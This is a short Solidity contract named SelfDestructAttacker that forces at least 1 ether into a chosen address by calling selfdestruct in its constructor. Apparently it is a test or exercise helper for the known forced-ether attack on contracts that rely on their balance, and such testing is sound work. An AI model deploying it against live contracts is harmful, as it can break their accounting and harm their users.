// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract SelfDestructAttacker {
    constructor(address fundsReceiver) payable {
        if (msg.value < 1 ether) {
            revert("Not enough funds");
        }

        selfdestruct(payable(fundsReceiver));
    }
}
